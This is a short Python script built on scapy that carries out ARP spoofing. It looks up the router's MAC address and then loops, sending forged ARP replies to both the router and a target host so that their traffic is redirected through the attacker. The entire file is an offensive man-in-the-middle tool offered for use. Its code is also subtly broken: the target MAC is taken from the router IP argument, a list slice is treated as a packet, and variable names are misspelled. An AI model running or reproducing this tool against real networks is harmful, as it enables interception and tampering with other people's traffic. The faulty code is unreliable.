import scapy.all

import sys
import time

from scapy.layers.l2 import ARP
from scapy.sendrecv import srp, send


def get_mac_address(ip_address):
    broadcast_layer = scapy.layers.l2.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_layer =ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = srp(get_mac_packet, timeout=1, verbose=False)[0]
    return answer[0:1].hwsrc


def spoof(router_ip, tartget_ip, router_mac, target_mac):
    packet1 = ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=tartget_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=tartget_ip, psrc=router_ip)
    send(packet1)
    send(packet2)


targer_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])
target_mac = str(sys.argv[1])
router_mac = str(get_mac_address((router_ip)))

try:
    while True:
        spoof(router_ip, targer_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Closing ARP Spoofer')
    exit()